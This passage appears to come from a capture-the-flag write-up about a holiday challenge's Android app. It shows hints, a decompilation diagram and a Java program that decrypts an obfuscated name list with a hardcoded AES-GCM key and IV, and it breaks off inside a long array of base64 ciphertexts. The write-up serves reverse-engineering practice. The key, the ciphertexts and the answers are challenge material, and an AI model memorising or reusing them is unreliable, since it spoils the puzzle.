who!</p> <p>Could you start with the debug version first, figure out which child\u2019s name isn\u2019t shown in the list within the app, then we can move on to release? I\u2019d be eternally grateful!</p>"},{"location":"objectives/act_2/o6_mobile/#hints","title":"Hints","text":"Missing <p>Maybe look for what names are included and work back from that?</p> Tools <p>Try using apktool or jadx</p> Hard - Format <p>So yeah, have you heard about this new Android app format? Want to convert it to an APK file?</p> Hard - Encryption and Obfuscation <p>Obfuscated and encrypted? Hmph. Shame you can't just run strings on the file.</p>"},{"location":"objectives/act_2/o6_mobile/#solution","title":"Solution","text":""},{"location":"objectives/act_2/o6_mobile/#diagrams","title":"Diagrams","text":"<pre><code>sequenceDiagram\n  autonumber\n  Decompile APK-&gt;&gt;read: to get smali files from the debug file\n  loop Read code files\n      read-&gt;&gt;read: Search smali files for anything interesting\n  end\n  Note right of Decompile APK: For example, use APKLab in VSCode\n  read-&gt;&gt;list: Find the names (and locations) in DatabaseHelper.smali\n  apk-&gt;&gt;android: Run the APK in a simulated device through Android Studio\n  android&lt;&lt;-&gt;&gt;list: Compare the displayed list with the smali file</code></pre> <p>Ellie</p> <p>Ellie from Alabama, USA is missing</p>"},{"location":"objectives/act_2/o6_mobile/#gold","title":"Gold","text":"<p>Gold is a bit more complex. First, we have to convert the  aab into apk.</p> <p>The information we want is still in DatabaseHelper.java but this time it is obsfucated: <pre><code>super(context, DATABASE_NAME, (SQLiteDatabase.CursorFactory) null, 1);\nIntrinsics.checkNotNullParameter(context, \"context\");\nString string = context.getString(C0793R.string.f175ek);\nIntrinsics.checkNotNullExpressionValue(string, \"getString(...)\");\nString obj = StringsKt.trim((CharSequence) string).toString();\nString string2 = context.getString(C0793R.string.f176iv);\nIntrinsics.checkNotNullExpressionValue(string2, \"getString(...)\");\nString obj2 = StringsKt.trim((CharSequence) string2).toString();\nbyte[] decode = Base64.decode(obj, 0);\nIntrinsics.checkNotNullExpressionValue(decode, \"decode(...)\");\nthis.encryptionKey = decode;\nbyte[] decode2 = Base64.decode(obj2, 0);\nIntrinsics.checkNotNullExpressionValue(decode2, \"decode(...)\");\nthis.f174iv = decode2;\nthis.secretKeySpec = new SecretKeySpec(decode, \"AES\");\n</code></pre></p> <p>We can see how the encryption works in another file (C0793R.java): <pre><code>    /* renamed from: ek */\n    public static int f175ek = 2131296307;\n    /* renamed from: iv */\n    public static int f176iv = 2131296311;\n    // Which in res/values/strings.xml shows:\n    // Ek: rmDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw=\n    // IV: Q2hlY2tNYXRlcml4\n    private final String decryptData(String str) {\n        try {\n            Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n            cipher.init(2, this.secretKeySpec, new GCMParameterSpec(128, this.f174iv));\n            byte[] doFinal = cipher.doFinal(Base64.decode(str, 0));\n            Intrinsics.checkNotNull(doFinal);\n            return new String(doFinal, Charsets.UTF_8);\n        } catch (Exception e) {\n            Log.e(\"DatabaseHelper\", \"Decryption failed: \" + e.getMessage());\n            return null;\n        }\n    }\n</code></pre></p> <p>We can create our own Java file to decrypt it:</p> <pre><code>import javax.crypto.Cipher;\nimport javax.crypto.spec.GCMParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Iterator;\n\npublic class DecompileClass {\n    public static String decryptData(String str) {\n        byte[] encryptionKey = Base64.getDecoder().decode(\"rmDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw=\");\n        byte[] f174iv = Base64.getDecoder().decode(\"Q2hlY2tNYXRlcml4\");\n        SecretKeySpec secretKeySpec = new SecretKeySpec(encryptionKey, \"AES\");\n        try {\n            Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n            cipher.init(2, secretKeySpec, new GCMParameterSpec(128, f174iv));\n            byte[] doFinal = cipher.doFinal(Base64.getDecoder().decode(str));\n            return new String(doFinal, StandardCharsets.UTF_8);\n        } catch (Exception e) {\n            //Log.e(\"DatabaseHelper\", \"Decryption failed: \" + e.getMessage());\n            System.err.println(\"Decryption failed: \" + e.getMessage());\n            return null;\n        }\n    }\n\n    public static void main(String args[]) {\n        String[] names = new String[]{\"L2HD1a45w7EtSN41J7kx/hRgPwR8lDBg9qUicgz1qhRgSg==\", \"IWna1u1qu/4LUNVrbpd8riZ+w9oZNN1sPRS2ujQpMqAAt114Yw==\", \"MWfO0+M1t5IvQtN2ad9w3hp81sYQIIaX6veq03bnk6I4H/1n89gW\", \"LmHJ164506skXdh3K9MZ/BBiw90TRO2mD0Hp9Nuoxu4ghx5/WQ==\", \"J2XF2645xKciX9RgK9MR+wZ60NIbKIsOTRSHP0jkBJPaF0djlqbc\", \"LGfJ0q451qslWt14aZd8rjtr1ZMtJItIvrKk8RRQWh2U6bQSEdPga59XDQ==\", \"LWTBzOt4u/4KXt99aJ18riBgy8cSJcpvtrKnM4IEsMDr9AwtlSJW+S/jdoHvXA==\", \"I2HM3+w1t4opQ953c5x8rjZvzNITIEFFaMC3bP4bW/FptwSEIzo=\", \"K3vJ2Od1+79qEeN2apZ8rjx6w98OKXRQNvvj/tYXj2mFoDhaZw==\", \"O33D06452K0nWtA1J7kx/hRgtZNzI71BDpxorJ6mxImw/A==\", \"L2na0+M1t58yWdR3dN9wyQdrx9ASZFBP13TAtgvjKYVFW9J6rA==\", \"KmnGya451bs0Xdh3K9MX6wdjw90OdugnqIwKHDmVzoF7PjkQJQ==\", \"IWDN1K451bsvW9h3YN9wzR1nzNLx7AaHK857pwQ3GlLQ2i+e\", \"I2XByK451L8vQ941J7Y39wV6pk1FpbJdc3QZRlpVuVIsjQ==\", \"JGnc0+94u/4FUMJ4ZZ8x4BZvjpM6LphLvL+vfIsRMj38FLu+GyCyUdPJ2g==\", \"I2TNwq452bsxEeh2dZh8riBd4zTtytJ89Bxu9NEok+aDWmI=\", \"J2TN1OM1t5MpQtJ2cN9w3AB90doWBr/HMmnvw088K+A8OYyeqg==\", \"Ln3L26452rcqUN81J7ok7xl32UJTvrQCKVSd6Z+tiX2Hmg==\", \"Lm3B1uM1t5wjWMNsc99wwhBsw90YLyjPYh2rLfMJ1C4VX2kQBpE=\", \"KGfG2/E1t40yXtJyb5w841ku8cQSJY9K1bwgTiInx6cYV5Ui/DM+sA==\", \"L23BlqJK/78oVtl4bt9wzR1nzNKBr23V1KlRgUeyT5PagT9r\", \"MWnFz+d1u/4EVMN3K9MD+Rx62NYFLYtKu34IoIzUoRVftPjhSrdCxro=\", \"LGnM0+M1t5UvVMc1J6Y7/BRnzNY2Zug0wYGSAMBLA1AcU9yx\", \"NGHLzu1ru/4ERNJxZoE1/QEiguEYLItKtr0WsmwcMfhswLv9Tec+ZRjR\", \"I2Hb0uM1t5AnWMN2ZZp8rj5rzMoWa/+6xCGsNnHvb00IU4Fr3Q==\", \"JmnG0+d1u/4JQt12K9Me4Qd5w8o6jn3t2IdQwSuXYx7u//Cv\", \"I2bBzuM1t5MzXNN4bt9wxxtqy9JRetksUopAr2UrK5xAUHDW\", \"JmHN3e01t5MjSdh6aNMT5wF3jpM6JJJNvLOoRJgv4sLKLQau2YBLzokQ\", \"LmHG3uM1t50pQdR3b5I36xsigvcSL4dFrbfU9Cqvl5I/xLcz0XU03pLK\", \"I2bc1ew1t4gvVN93Zt9wzwB91sEeIIGZ9QAB6FA50LlDQiHup1s=\", \"MWna264537sqQth3bJp8rjNnzN8WL47gYBHKOnMA/05AZVXhUewu\", \"KGfa3ec1t5IvXNA1J6M1/ACz8Z0iiXnvwFsEg5jrkLGq\", \"JXrJ2ec1t5siWN97coE35lku8dAYNYZFsbi05FzIyksNODX0NjFqyvVn\", \"L2nc3+01t5wzVN92dNMR5wdr0Z9XAJhDurK0PoMIwB3/YInPpneEf/Q3blsrDg==\", \"J2XB1vs1t5ozU91wad9wxwdrztIZJQMfNE4DYwx1R7bg5c50NDQ=\", \"Jmne0+Y1t5QpWdB3aZYj7AB8xZ9XEoVRq7TgFosbO6NUOYiKnRWuNaKuxMtDzqVA7Q==\", \"LGfa26451rM1RdRrY5I9olVAx8cfJJhIvrKkJJm3opYYxGiM9SQhFp8qlek=\", \"MXzN3ON3u/4EVN1+dZI061ku8dYFI4NF6DAFvK8r77cS9dUOpitQRg==\", \"KWHFlqJK8rEzXZ05VJwl+h0u6dwFJIuDD8ONR42MoY7KFht/QJfy\", \"Ln3L0+M1t5wnQ9J8a5w+71ku8cMWKIQC0zxiXHG/YZvw7T+TNIqz\", \"LWXJyK451rMrUN81J7k//BFvzGO14j2tV1Au4CjIir5oH4s=\", \"L2na0+c1t44nQ9hqK9MW/BRgwdazin6FJqgBFVKkiYZE/Oku\", \"NmfFlqJa/7clUNZ2K9MF3TR3qVJdK8qDeVx+ZJ0MHnNU\", \"Km3E3+x4u/4WQ9B+cpZ8rjZ0x9AfYbhBr6miO4QKWNrxWDpCUMmjm7xYtCdc6A==\", \"I3rCz+w1t5ojXdlwK9MZ4BFnwzwsgLd0z5uSRxTqIB8aQs4=\", \"L2nazuM1t4knQ8J4cN9w3hpiw90TTjWQOk7MWqw/XG0TO0AeQA==\", \"MWHF1ew1t4QzQ9h6b99w3QJn1skSM4ZFsbgRVLExuZmptZSHE6Yrul/e\", \"I2bJlqJD9rk0VNM1J7Ai4RR6y9JIjLKEIfFIhBPBpLBEqomH\", \"MGnO2+d1u/4KWMJ7aJ18riVh0McCJotIhSM4dPg694vcV/24WexvGQ==\", \"LmHG3uM1t4wjSNpzZoU55Vku69ASLYtKu2L+bDaBlZjDIaGNeZhBJqA=\", \"L2HL0uN1u/4EQ9BtboA87wNvjpMkLYVSvrepNgEBI1AclZNI8gyCBYQG2eM=\", \"J37JlqJb4ronQdRqc99wxgBgxdIFOAlaPoAgk8c4iPDAzcEuNDE=\", \"LGHD1e54/vJmfNh3dJh8rjdrztIFNJmu2xg+J6QSEiIx6k9QIl+a\", \"KWDJ3utz9vJmddByZoF8riZrzNYQIIbM23+WAVV6B504yBF/YTdb\", \"O2fdyfF88fJmY9B7Zod8rjhh0NwUIoVxNH9I0bHcUbdrTrTpnIWL\", \"LmndyOM1t5IvXNA1J6M1/ADJIEAtaTSWOs3rUHGxE23v\", \"KH3J1K45xqsvRd41J7Yz+xRqzcGKc2ANFJm7yAP/iEAOkACn\", \"I2TBlqJN4rAvQp05U4Y+5wZnw7REbFTEsKKaYtEbT4D/BfA=\", \"I2TB1OM1t40pV9h4K9MS+xlpw8EeIHcUEuddwvPOGYIPlGbXuns=\", \"JmHF0/Zr/vJmZdNwa5oj51ku5dYYM41Nvhg6ySTDiTI5vv18a6J6y14=\", \"J2XF2+xs8rJqEf14YJwjolVAy9QSM4NFBawvI9LTb3YoXPhmLC/pDw==\", \"KH3E0+M1t4gvVN93Zt9wzwB91sEeIEtgVtuakzge6p44dqbJkEc=\", \"MGfK3/Btu/4BXdBqYJwnolVdwdwDLYtKu+LDoHra5pWd9cdD5y0f3Mo=\", \"I2bJyfZ45LcnHZFKZpo++lVex8cSM5lGqq6ne807J7NGCggtcc93Ohi+VKRgXDKpmdgI\", \"J2bS1a452r80QtRwa581olVI0NIZIo+b1vqa1HqNcwPKRRUCkA2e\", \"I2Hb0uM1t5QnWtBrc5J8rjxgxtwZJJlNvvHYzXGTBJ/ect8fCv2lmE4=\", \"L2nc3/dq7fJmesN4bJwnolVezd8WL47o08C8QCvrmNi28s6uzbkB\", \"MGfb2645378wUN94K9MT+xdvICDOUBRXAjmOpELQySokFQ==\", \"JmHN3e01t40nX8V2J7c/4xxgxdxbYa5LsrWuPo4IPOBnBhkbfJx6kuAQ5S2AHRJNPm+/JMsu2Y4=\", \"K3vJ2Od1u/4LUN9wa5J8riVmy98eMZpNsbmz/o7XqAaLAwARWkH6eIgkvg==\", \"JmnG0+d1u/4FUMN4ZJIjolVYx90SO59Bs72pxXLFYIQzfSavfBYeKvSp\", \"MWfO0+M1t40pV9h4K9MS+xlpw8EeIOWh30NfCMogzRbG9bbOpOQ=\", \"L33bzuN/9vJmcN9yZoExolVa18EcJJMyCPdCGbm3ITUv4dWqaqTJ\", \"JW3HyOV8u/4IUNhraJE5olVFx90OIIDivPFcm6m1iBokvOvJ6Jw=\", \"LmHG26451L8vQ941J7Y39wV6CD4JBxN6y16SruzezWKPkA==\", \"KGfb3645xL8oEft2dDD5olVNzcADIMp2tr+hjSygfMWJwjL2dFscDmwjjg==\", \"L2HJlqJN9rIqWN93K9MV/QFhzNoWqj9VHhFMZ8Go9BUGzcsDyA==\", \"J2TB2/E1t5YjXcJwaZg5olVIy90bIIRA/1z33GgMGZTTRJFra6XBzA==\", \"OGna26453q0qUNx4ZZI0olVew9geMp5FsXmupyWxdH/oy9rxaRJqUOA=\", \"I2zJ16451awnRdhqa5Im71ku8d8YN4tPtr1l2Twrd2VbP7DifnHx1H8R\", \"J2TB3K453q0yUN97cp98riF70NgSOCtbDxARU2xtlLgyGO7yaRU=\", \"Ln3LlqJb5as1QtR1dN9wzBBixdoCLK9D8qtP2JBdQm86rVaciwM=\", \"LmndyOM1t5MnVcNwY99w3QVvy916DDmwWl6gWeYjk2X3jVl2\", \"NGHLzu1ru/4ERNJxZoE1/QEiguEYLItKtr0WsmwcMfhswLv9Tec+ZRjR\", \"I2TNwuN386wjHZFVcos14xdh18EQbcpoqqSlOo8GJ7JSkODr7+fBPtiGNds2i5nCLw==\", \"KGfb0vd4u/4EWMN0bp035hRjjpMiL4NQurjgHIQHNaRaDnIYbKQ9JusGaa1aAkGEVV8=\", \"J2XF26451qslWt14aZd8rjtr1ZMtJItIvrKk5S9JSEZ8qKvgRP2Mvcy4eQ==\", \"Ln3Bya45xL8oRdh4YJx8rjZmy98Sl+3RcG/g8aeHWMyfJPImOg==\", \"IWnc0udr/rAjHZFWc4cx+RQigvAWL4tAvg5ALUCnxBG/cw3LfEmj4oA=\", \"NmfFeSNqu/4LXt9tYoU56hBhjpMiM59Dqr253YTDn38uXKJ5tl00FEINTg==\", \"I2bG26451LE2VN9xZpQ14Fku5tYZLItWtJEJuhXmygDg52L+RBvqJyA=\", \"Mm3c3/A1t5E1Xd41J70//AJv27+zexRjk1E0oOdUtHEChqA=\", \"KH3E0+M1t5wjQ91wad9wyRB8z9IZOJNUHr+RrQebnoaStFwY+6Y=\", \"MWnFz+d1u/4QWNR3aZJ8rjR70ccFKItX81FQp//+9EtF+nURL4FI\", \"LGHG264527QzU91zZp0xolVdztwBJIRNvlt7/VakIoRl++rXlHttwhE=\", \"I2bMyOdwu/4FWdhqbp0x+1ku79wbJYVSvr7qGO5Zb23L3xCvXHMRYvs=\", \"KWnBlqJR8rI1WN9ybt9wyBxgztIZJUkQdjl75fDWiRSzBI1CHdw=\", \"I2DF3+Y1t50nWMN2K9MV6Qx+1mbIOp5nPzrOusVi9a3n/50=\", \"O2nb1+t38vJmctBqZpE87xttw59XDIVWsL+jOGYAZSakGQcwH9LkY0MNP74=\", \"Lm3H1K45zb8hQ9R7K9MT/Bpv1toWCeg3YKGO+eApkQGBF09JMw==\", \"K3vJ2Od1+79qEeN2apZ8rjx6w98OKXRQNvvj/tYXj2mFoDhaZw==\", \"JG3E0/o1t5MzX9h6b99wyRB8z9IZOEuf/8PQJ7tJYwF2ZBYDZDY=\", \"L2nc3+01t5wpVt5txFJ8rjZhztwaI4NFdKbrVcU/JGUSzKJm3q3PSQ==\", \"LWTBzOt4u/4RVN11bp03+hpgjpM5JJ0EhbmhO4wHNjmjzqwzDO366z8XlmAxBAo=\", \"JmnG0+d1u/4MXtl4aZ01/Rd70NRbYblLqqiod6wPIKlWAvC4AsA71TXm3aAJve9HIUA=\", \"LGfa2645278hXsI1J7056RB8y9LIAUNdOdmXkW3fRpcNUxV8\", \"MXzN3ON3u/4EVN1+dZI061ku8dYFI4NF6DAFvK8r77cS9dUOpitQRg==\", \"Lm3B1uM1t58qVth8dYB8rjRixdYFKItGdCiZJowXSEk2P7+XCerx\", \"KWHFlqJb4q0nX505VJwl+h0u6dwFJIuiXi2lY6YPZ4CjViAKRpaC\", \"Ln3L0+M1t5wnQ9J8a5w+71ku8cMWKIQC0zxiXHG/YZvw7T+TNIqz\", \"LWXJyK4507EuUJ05VpIk7wcjUnL2xhkJz8n9Dm47dXGt\", \"L2na0+c1t5IzSdR0ZZwl/BIigv8COY9JvbO1JYqohuoT5OQ0dvvUWILo1jaO\", \"NmfFlqJK9rBmd8N4aZA5/RZhjpMiEqvWVxuq2sU0ngeuJh5Bmivp\", \"Km3E3+x4u/4QWNR3aZJ8rjR70ccFKIsDa5wYsSNXEVH6T9VNnoNh\", \"I3rCz+w1t5wnX9Z4a5wi61ku690TKIvYZgzmW1HQgG0OvS+GZrqX\", \"L2nazuM1t440UNZsYt9wzQ9rwdtXE49Uqr6sPo4tNlgEErLmy2e9McwjexaZ\", \"MWHF1ew1t5kjX9RvZt9w3QJn1skSM4ZFsbjUNmfsNMnhkq0GBwNdRuQQ\", \"I2bJlqJD9rk0VNM1J7Ai4RR6y9JIjLKEIfFIhBPBpLBEqomH\", \"MGnO2+d1u/4WXsNtaN9w3hp81sYQIIbYlRYHiSlXMoS4tPdilxhG\", \"LmHG3uM1t4wjSNpzZoU55Vku69ASLYtKu2L+bDaBlZjDIaGNeZhBJqA=\", \"L2HL0uN1u/4EQ9BtboA87wNvjpMkLYVSvrepNgEBI1AclZNI8gyCBYQG2eM=\", \"J37JlqJb4ronQdRqc99wxgBgxdIFOAlaPoAgk8c4iPDAzcEuNDE=\", \"LGHD1e54/vJmfN5qZJwnolVc18AEKIvjrzloQ+cC1iWupZVahPs2\", \"KWDJ3utz9vJmddByZoF8riZrzNYQIIbM23+WAVV6B504yBF/YTdb\", \"O2fdyfF88fJmY9B7Zod8rjhh0NwUIoVxNH9I0bHcUbdrTrTpnIWL\", \"LmndyOM1t5IvXNA1J6M1/ADJIEAtaTSWOs3rUHGxE23v\", \"KH3J1K45xqsvRd41J7Yz+xRqzcGKc2ANFJm7yAP/iEAOkACn\", \"L2na0+M1t40nX5FTcpI+olVe19YFNYUEjbWjOJpcl9JvvyJ7scI8el5JTy4=\", \"I2TBlqJN4rAvQp05U4Y+5wZnw7REbFTEsKKaYtEbT4D/BfA=\", \"I2TB1OM1t5wzUtl4dZYj+lku8NwaIIRNvvtC1rkdlxBlbKrQAX6AucI=\", \"JmHF0/Zr/vJmeth8cd9w2x58w9oZJM51yxayaVH4ddqhS9Ld+lI=\", \"J2XF2+xs8rJqEf14YJwjolVAy9QSM4NFBawvI9LTb3YoXPhmLC/pDw==\", \"KH3E0+M1t4gvVN93Zt9wzwB91sEeIEtgVtuakzge6p44dqbJkEc=\", \"MGfK3/Btu/4BXdBqYJwnolVdwdwDLYtKu+LDoHra5pWd9cdD5y0f3Mo=\", \"I2bJyfZ45LcnHZFKZpo++lVex8cSM5lGqq6ne807J7NGCggtcc93Ohi+VKRgXDKpmdgI\", \"J2bS1a452rcqUN81J7ok7xl3dnBUBK/NLqVw5yX69lhDyQ==\", \"I2Hb0uM1t5QnWtBrc5J8rjxgxtwZJJlNvvHYzXGTBJ/ect8fCv2lmE4=\", \"L2nc3/dq7fJmdtV4aYA7olVezd8WL47176gxNd+vY9fx4MSmT2ej\", \"MGfb2645378wUN94K9MT+xdvICDOUBRXAjmOpELQySokFQ==\", \"JmHN3e01t40nX8V2J7c/4xxgxdxbYa5LsrWuPo4IPOBnBhkbfJx6kuAQ5S2AHRJNPm+/JMsu2Y4=\", \"K3vJ2Od1u/4LUN9wa5J8riVmy98eMZpNsbmz/o7XqAaLAwARWkH6eIgkvg==\", \"JmnG0+d1u/4FUMN4ZJIjolVYx90SO59Bs72pxXLFYIQzfSavfBYeKvSp\", \"MWfO0+M1t40pV9h4K9MS+xlpw8EeIOWh30NfCMogzRbG9bbOpOQ=\", \"L33bzuN/9vJmc9B+b5cx6lku68EWMIJsYV5vA84d075o0zjkKww=\", \"L23BlqJN9rc2VNg1J6cx5wJvzCDEGFoHhNAE0ZQMzBepH+M=\", \"JW3HyOV8u/4IUNhraJE5olVFx90OIIDivPFcm6m1iBokvOvJ6Jw=\", \"LmHG26451bsvQ8RtK9Mc6xdvzNwZZ/8B9lM2+mUZn77BIM0HBQ==\", \"KGfb3645xL8oEft2dDD5olVNzcADIMp2tr+hjSygfMWJwjL2dFscDmwjjg==\", \"L2HJlqJN9rIqWN93K9MV/QFhzNoWqj9VHhFMZ8Go9BUGzcsDyA==\", \"KGfG2/E1t4gvXd9wcoB8rjln1tsCIIRNvmU7T9+1tpsYdtrvmWv1l7U=\", \"J2TB2/E1t5YjXcJwaZg5olVIy90bIIRA/1z33GgMGZTTRJFra6XBzA==\", \"OGna26453q0qUNx4ZZI0olVew9geMp5FsXmupyWxdH/oy9rxaRJqUOA=\", \"I2zJ16451awnRdhqa5Im71ku8d8YN4tPtr1l2Twrd2VbP7DifnHx1H8R\", \"J2TB3K451rAtUMN4K9ME+wdlx8rZbZqbfhGZr3wzxCxB4bYI\", \"Ln3LlqJJ9qwvQp05QYEx4BZrln569Gq0kHSy+WS+n1k/sA==\", \"LmndyOM1t5MnVcNwY99w3QVvy916DDmwWl6gWeYjk2X3jVl2\", \"NGHLzu1ru/4ERNJxZoE1/QEiguEYLItKtr0WsmwcMfhswLv9Tec+ZRjR\", \"MWna2645xKopUtpxaJ89olVd1dYTJISsz5CtbxJFXJPiMCte0noG\", \"I2TNwuN386wjHZFbdYYj/RBi0Z9XA49IuLW1OoUxRdZ+wmfnJvvtJwXi10k=\", \"L2na0+M1t5IvQtN2ad9w3hp81sYQIIYOpc2XzyjeMgAWf7nbp/ts\", \"L2HL0uN8+/Jmfd53Y5w+olVbzNoDJI4ElLWuMIkGP9LTeVuwVKu4l7DOB1U91N0=\", \"J2XB1vs1t5ozU91wad9wxwdrztIZJQMfNE4DYwx1R7bg5c50NDQ=\", \"Jmne0+Y1t40/Vd98ft9wzwB91sEWLYNFu2xWVc39+4i1Bn7JWwoynA==\", \"J2XF26451qslWt14aZd8rjtr1ZMtJItIvrKk5S9JSEZ8qKvgRP2Mvcy4eQ==\", \"Ln3Bya452rs+WNJ2J7A5+gwigv4SOYNHsHi4IVfVImdVO9OdwBX0/mw=\", \"IWnc0udr/rAjHZFWc4cx+RQigvAWL4tAvg5ALUCnxBG/cw3LfEmj4oA=\", \"NmfFeSNqu/4LXt9tYoU56hBhjpMiM59Dqr253YTDn38uXKJ5tl00FEINTg==\", \"I2bG26451LE2VN9xZpQ14Fku5tYZLItWtJEJuhXmygDg52L+RBvqJyA=\", \"Mm3c3/A1t5E1Xd41J70//AJv27+zexRjk1E0oOdUtHEChqA=\", \"KH3E0+M1t5wjQ91wad9wyRB8z9IZOJNUHr+RrQebnoaStFwY+6Y=\", \"MWnFz+d1u/4QWNR3aZJ8rjR70ccFKItX81FQp//+9EtF+nURL4FI\", \"LGHG264527QzU91zZp0xolVdztwBJIRNvlt7/VakIoRl++rXlHttwhE=\", \"I2bMyOdwu/4FWdhqbp0x+1ku79wbJYVSvr7qGO5Zb23L3xCvXHMRYvs=\", \"KWnBlqJR8rI1WN9ybt9wyBxgztIZJUkQdjl75fDWiRSzBI1CHdw=\", \"I2DF3+Y1t50nWMN2K9MV6Qx+1mbIOp5nPzrOusVi9a3n/50=\", \"O2nb1+t38vJmctBqZpE87xttw59XDIVWsL+jOGYAZSakGQcwH9LkY0MNP74=\", \"Lm3H1K45zb8hQ9R7K9MT/Bpv1toWCeg3YKGO+eApkQGBF09JMw==\", \"K3vJ2Od1+79qEeN2apZ8rjx6w98OKXRQNvvj/tYXj2mFoDhaZw==\", \"JG3E0/o1t5MzX9h6b99wyRB8z9IZOEuf/8PQJ7tJYwF2ZBYDZDY=\", \"MWfO0+M1t58yWdR3dN9wyQdrx9AS/R916miej6pBB+UB54ZZ1g==\", \"L2nc3+01t5wzVN92dNMR5wdr0Z9XAJhDurK0PoMIwB3/YInPpneEf/Q3blsrDg==\", \"LWTBzOt4u/4RVN11bp03+hpgjpM5JJ0EhbmhO4wHNjmjzqwzDO366z8XlmAxBAo=\", \"JmnG0+d1u/4MXtl4aZ01/Rd70NRbYblLqqiod6wPIKlWAvC4AsA71TXm3aAJve9HIUA=\", \"LGfa2645278hXsI1J7056RB8y9LIAUNdOdmXkW3fRpcNUxV8\", \"MXzN3ON3u/4EVN1+dZI061ku8dYFI4NF6DAFvK8r77cS9dUOpitQRg==\", \"Lm3B1uM1t58qVth8dYB8rjRixdYFKItGdCiZJowXSEk2P7+XCerx\", \"KWHFlqJK8rEzXZ05VJwl+h0u6dwFJIuDD8ONR42MoY7KFht/QJfy\", \"Ln3L0+M1t5wnQ9J8a5w+71ku8cMWKIQC0zxiXHG/YZvw7T+TNIqz\", \"LWXJyK4507EuUJ05VpIk7wcjUnL2xhkJz8n9Dm47dXGt\", \"L2na0+c1t5IzSdR0ZZwl/BIigv8COY9JvbO1JYqohuoT5OQ0dvvUWILo1jaO\", \"NmfFlqJR+Ks1Rd53K9MF3TQJIJtqQwmr4zdVTQ9laNPM\", \"Km3E3+x4u/4QWNR3aZJ8rjR70ccFKIsDa5wYsSNXEVH6T9VNnoNh\", \"I3rCz+w1t5ojXdlwK9MZ4BFnwzwsgLd0z5uSRxTqIB8aQs4=\", \"L2nazuM1t440UNZsYt9wzQ9rwdtXE49Uqr6sPo4tNlgEErLmy2e9McwjexaZ\", \"MWHF1ew1t4QzQ9h6b99w3QJn1skSM4ZFsbgRVLExuZmptZSHE6Yrul/e\", \"I2bJlqJD9rk0VNM1J7Ai4RR6y9JIjLKEIfFIhBPBpLBEqomH\", \"MGnO2+d1u/4WXsNtaN9w3hp81sYQIIbYlRYHiSlXMoS4tPdilxhG\", \"LmHG3uM1t4wjSNpzZoU55Vku69ASLYtKu2L+bDaBlZjDIaGNeZhBJqA=\", \"L2HL0uN1u/4EQ9BtboA87wNvjpMkLYVSvrepNgEBI1AclZNI8gyCBYQG2eM=\", \"J37JlqJb4ronQdRqc99wxgBgxdIFOAlaPoAgk8c4iPDAzcEuNDE=\", \"LGHD1e54/vJmfN5qZJwnolVc18AEKIvjrzloQ+cC1iWupZVahPs2\", \"KWDJ3utz9vJmddByZoF8riZrzNYQIIbM23+WAVV6B504yBF/YTdb\", \"O2fdyfF88fJmY9B7Zod8rjhh0NwUIoVxNH9I0bHcUbdrTrTpnIWL\", \"LmndyOM1t5IvXNA1J6M1/ADJIEAtaTSWOs3rUHGxE23v\", \"KH3J1K45xqsvRd41J7Yz+xRqzcGKc2ANFJm7yAP/iEAOkACn\", \"L2na0+M1t40nX5FTcpI+olVe19YFNYUEjbWjOJpcl9JvvyJ7scI8el5JTy4=\", \"I2TBlqJN4rAvQp05U4Y+5wZnw7REbFTEsKKaYtEbT4D/BfA=\", \"I2TB1OM1t5wzUtl4dZYj+lku8NwaIIRNvvtC1rkdlxBlbKrQAX6AucI=\", \"JmHF0/Zr/vJmeth8cd9w2x58w9oZJM51yxayaVH4ddqhS9Ld+lI=\", \"J2XF2+xs8rJqEf14YJwjolVAy9QSM4NFBawvI9LTb3YoXPhmLC/pDw==\", \"KH3E0+M1t4gvVN93Zt9wzwB91sEeIEtgVtuakzge6p44dqbJkEc=\", \"MGfK3/Btu/4BXdBqYJwnolVdwdwDLYtKu+LDoHra5pWd9cdD5y0f3Mo=\", \"I2bJyfZ45LcnHZFKZpo++lVex8cSM5lGqq6ne807J7NGCggtcc93Ohi+VKRgXDKpmdgI\", \"J2bS1a452rcqUN81J7ok7xl3dnBUBK/NLqVw5yX69lhDyQ==\", \"I2Hb0uM1t5QnWtBrc5J8rjxgxtwZJJlNvvHYzXGTBJ/ect8fCv2lmE4=\", \"L2nc3/dq7fJmdtV4aYA7olVezd8WL47176gxNd+vY9fx4MSmT2ej\", \"MGfb2645378wUN94K9MT+xdvICDOUBRXAjmOpELQySokFQ==\", \"JmHN3e01t40nX8V2J7c/4xxgxdxbYa5LsrWuPo4IPOBnBhkbfJx6kuAQ5S2AHRJNPm+/JMsu2Y4=\", \"K3vJ2Od1u/4LUN9wa5J8riVmy98eMZpNsbmz/o7XqAaLAwARWkH6eIgkvg==\", \"JmnG0+d1u/4FUMN4ZJIjolVYx90SO59Bs72pxXLFYIQzfSavfBYeKvSp\", \"MWfO0+M1t40pV9h4K9MS+xlpw8EeIOWh30NfCMogzRbG9bbOpOQ=\", \"L33bzuN/9vJmc9B+b5cx6lku68EWMIJsYV5vA84d075o0zjkKww=\", \"L23BlqJN9rc2VNg1J6cx5wJvzCDEGFoHhNAE0ZQMzBepH+M=\", \"JW3HyOV8u/4IUNhraJE5olVFx90OIIDivPFcm6m1iBokvOvJ6Jw=\", \"LmHG26451bsvQ8RtK9Mc6xdvzNwZZ/8B9lM2+mUZn77BIM0HBQ==\", \"KGfb3645xL8oEft2dDD5olVNzcADIMp2tr+hjSygfMWJwjL2dFscDmwjjg==\", \"L2HJlqJN9rIqWN93K9MV/QFhzNoWqj9VHhFMZ8Go9BUGzcsDyA==\", \"KGfG2/E1t4gvXd9wcoB8rjln1tsCIIRNvmU7T9+1tpsYdtrvmWv1l7U=\", \"J2TB2/E1t5YjXcJwaZg5olVIy90bIIRA/1z33GgMGZTTRJFra6XBzA==\", \"OGna26453q0qUNx4ZZI0olVew9geMp5FsXmupyWxdH/oy9rxaRJqUOA=\", \"I2zJ16451awnRdhqa5Im71ku8d8YN4tPtr1l2Twrd2VbP7DifnHx1H8R\", \"J2TB3K451rAtUMN4K9ME+wdlx8rZbZqbfhGZr3wzxCxB4bYI\", \"Ln3LlqJJ9qwvQp05QYEx4BZrln569Gq0kHSy+WS+n1k/sA==\", \"LmndyOM1t5MnVcNwY99w3QVvy916DDmwWl6gWeYjk2X3jVl2\", 